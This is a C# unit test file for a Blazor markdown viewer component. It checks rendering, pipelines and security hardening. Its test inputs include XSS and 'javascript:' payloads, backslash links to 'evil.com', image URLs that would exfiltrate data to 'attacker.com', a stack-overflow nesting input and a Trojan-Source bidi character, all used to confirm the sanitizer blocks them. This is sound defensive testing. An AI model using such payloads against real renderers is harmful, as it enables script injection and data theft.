using Bunit;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using System;
using System.Linq;

namespace Bit.BlazorUI.Tests.Components.Extras.MarkdownViewer;

[TestClass]
public class BitMarkdownViewerTests : BunitTestContext
{
    [TestMethod]
    public void BitMarkdownViewerShouldRenderExpectedClass()
    {
        var component = RenderComponent<BitMarkdownViewer>();

        var root = component.Find(".bit-mdv");

        Assert.IsNotNull(root);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderHeading()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# hello");
        });

        var root = component.Find(".bit-mdv");

        Assert.Contains("<h1>hello</h1>", root.InnerHtml);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderInlineFormatting()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "a **bold** and *italic* word");
        });

        var root = component.Find(".bit-mdv");

        Assert.Contains("<strong>bold</strong>", root.InnerHtml);
        Assert.Contains("<em>italic</em>", root.InnerHtml);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldTreatRawHtmlAsText()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "<script>alert(1)</script>");
        });

        var root = component.Find(".bit-mdv");

        // Raw HTML must be escaped (rendered as text), never as live markup.
        Assert.DoesNotContain("<script>", root.InnerHtml);
        Assert.Contains("&lt;script&gt;", root.InnerHtml);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldSanitizeUnsafeLinks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[click](javascript:alert(1))");
        });

        // Validate the rendered link's actual href rather than a substring of the HTML.
        // Removing the unsafe node entirely is also a valid (secure) sanitizer outcome.
        var links = component.FindAll(".bit-mdv a");
        if (links.Count > 0)
        {
            var href = links[0].GetAttribute("href") ?? string.Empty;
            Assert.IsTrue(
                href.Length == 0 || !href.Contains("javascript:", StringComparison.OrdinalIgnoreCase),
                $"Unsafe link href was not sanitized: '{href}'.");
        }
    }

    [TestMethod,
        DataRow(@"\\evil.com"),
        DataRow(@"/\evil.com"),
        DataRow(@"\/evil.com")]
    public void BitMarkdownViewerShouldSanitizeBackslashLinks(string url)
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            // Browsers treat leading backslashes like slashes (protocol-relative),
            // including mixed separator runs (BitMarkdownUrlSanitizer).
            parameters.Add(p => p.Markdown, $"[click]({url})");
        });

        var links = component.FindAll(".bit-mdv a");
        if (links.Count > 0)
        {
            var href = links[0].GetAttribute("href") ?? string.Empty;
            var leadingSeparators = href.TakeWhile(c => c is '/' or '\\');
            Assert.IsTrue(
                href.Length == 0 || !leadingSeparators.Contains('\\'),
                $"Backslash link href was not sanitized: '{href}'.");
        }
    }

    [TestMethod]
    public void BitMarkdownViewerShouldSanitizeUnsafeImages()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![alt](javascript:alert(1))");
        });

        // Validate the rendered image's actual src rather than a substring of the HTML.
        // Removing the unsafe node entirely is also a valid (secure) sanitizer outcome.
        var imgs = component.FindAll(".bit-mdv img");
        if (imgs.Count > 0)
        {
            var src = imgs[0].GetAttribute("src") ?? string.Empty;
            Assert.IsTrue(
                src.Length == 0 || !src.Contains("javascript:", StringComparison.OrdinalIgnoreCase),
                $"Unsafe image src was not sanitized: '{src}'.");
        }
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReparseWhenMarkdownChanges()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# one");
        });

        Assert.Contains("<h1>one</h1>", component.Markup);

        component.Render(parameters =>
        {
            parameters.Add(p => p.Markdown, "# two");
        });

        Assert.Contains("<h1>two</h1>", component.Markup);
        Assert.DoesNotContain("<h1>one</h1>", component.Markup);
    }

    [TestMethod,
        DataRow(true),
        DataRow(false)]
    public void BitMarkdownViewerShouldRespectIsEnabled(bool isEnabled)
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.IsEnabled, isEnabled);
            parameters.Add(p => p.Markdown, "enable");
        });

        var root = component.Find(".bit-mdv");

        if (isEnabled)
        {
            Assert.IsFalse(root.ClassList.Contains("bit-dis"));
        }
        else
        {
            Assert.IsTrue(root.ClassList.Contains("bit-dis"));
        }
    }

    [TestMethod]
    public void BitMarkdownViewerBasicPipelineShouldNotRenderTables()
    {
        var markdown = "| a | b |\n|---|---|\n| 1 | 2 |";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        Assert.DoesNotContain("<table", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerGitHubPipelineShouldRenderGfmFeatures()
    {
        var markdown = "~~gone~~\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n- [x] done\n- [ ] todo";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        var markup = component.Markup;

        Assert.Contains("<del>gone</del>", markup);
        Assert.Contains("<table", markup);
        Assert.Contains("type=\"checkbox\"", markup);
    }

    [TestMethod]
    public void BitMarkdownViewerAdvancedPipelineShouldRenderEmojiAndHeadingIds()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# Hello World :rocket:");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        var markup = component.Markup;

        Assert.Contains("🚀", markup);
        Assert.Contains("id=\"hello-world\"", markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReparseWhenPipelineChanges()
    {
        var markdown = "~~gone~~";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        Assert.DoesNotContain("<del>gone</del>", component.Markup);

        component.Render(parameters =>
        {
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        Assert.Contains("<del>gone</del>", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldBlockRemoteImagesInSameOriginMode()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![leak](https://attacker.com/leak?data=secret)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        // No src means the browser never issues the cross-origin (exfiltration) request.
        var src = imgs[0].GetAttribute("src") ?? string.Empty;
        Assert.AreEqual(string.Empty, src);
        // Alt text is preserved for accessibility.
        Assert.AreEqual("leak", imgs[0].GetAttribute("alt"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepRelativeImagesInSameOriginMode()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![local](/assets/logo.png)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual("/assets/logo.png", imgs[0].GetAttribute("src"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepAbsoluteSameOriginImagesInSameOriginMode()
    {
        // bUnit's test host resolves to http://localhost/, so an absolute URL that points
        // back at that origin must NOT be blocked under the SameOrigin policy.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![local](http://localhost/assets/logo.png)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual("http://localhost/assets/logo.png", imgs[0].GetAttribute("src"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldBlockRemoteImagesByDefault()
    {
        // ImageRendering defaults to the safe SameOrigin policy, so a cross-origin image
        // is blocked even when the parameter is not set explicitly.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![leak](https://attacker.com/leak?data=secret)");
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual(string.Empty, imgs[0].GetAttribute("src") ?? string.Empty);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldBlockProtocolRelativeImagesInSameOriginMode()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![x](//attacker.com/a.png)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual(string.Empty, imgs[0].GetAttribute("src") ?? string.Empty);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldBlockAllImagesInNoneMode()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![local](/assets/logo.png)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.None);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual(string.Empty, imgs[0].GetAttribute("src") ?? string.Empty);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldAddNoReferrerToImages()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![x](https://example.com/a.png)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.All);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual("https://example.com/a.png", imgs[0].GetAttribute("src"));
        Assert.AreEqual("no-referrer", imgs[0].GetAttribute("referrerpolicy"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotOverflowOnDeeplyNestedInput()
    {
        // Without a depth limit this triggers an (uncatchable) StackOverflowException
        // that would crash the host. The depth guard must keep it bounded.
        var markdown = new string('>', 5000) + " boom";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        Assert.Contains("boom", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldStripBidiControlCharactersWhenEnabled()
    {
        // U+202E (RIGHT-TO-LEFT OVERRIDE) is a Trojan-Source spoofing character.
        var markdown = "a\u202Eb";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.StripBidiControlCharacters, true);
        });

        Assert.DoesNotContain("\u202E", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepBidiControlCharactersByDefault()
    {
        var markdown = "a\u202Eb";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        Assert.Contains("\u202E", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReparseWhenHardeningOptionsChange()
    {
        // The component caches the parsed AST and only re-parses when an output-affecting
        // input changes. Toggling the hardening options after the first render must
        // invalidate that cache instead of reusing stale state.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![leak](https://attacker.com/a.png)\n\n# hello world");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.All);
        });

        // First render: All policy keeps the remote image and the full heading text.
        Assert.AreEqual("https://attacker.com/a.png", component.FindAll(".bit-mdv img")[0].GetAttribute("src"));
        Assert.Contains("<h1>hello world</h1>", component.Markup);

        // Tighten ImageRendering and cap the length; the cached AST must be rebuilt.
        component.Render(parameters =>
        {
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
            parameters.Add(p => p.MaxLength, 38); // truncates before "world"
        });

        Assert.AreEqual(string.Empty, component.FindAll(".bit-mdv img")[0].GetAttribute("src") ?? string.Empty);
        Assert.DoesNotContain("world", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReparseWhenStripBidiToggles()
    {
        var markdown = "a\u202Eb";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        // Default keeps the bidi control character.
        Assert.Contains("\u202E", component.Markup);

        component.Render(parameters =>
        {
            parameters.Add(p => p.StripBidiControlCharacters, true);
        });

        Assert.DoesNotContain("\u202E", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRespectMaxLength()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# hello world");
            parameters.Add(p => p.MaxLength, 3); // "# h"
        });

        var markup = component.Markup;
        Assert.Contains("<h1>h</h1>", markup);
        Assert.DoesNotContain("hello", markup);
    }
}
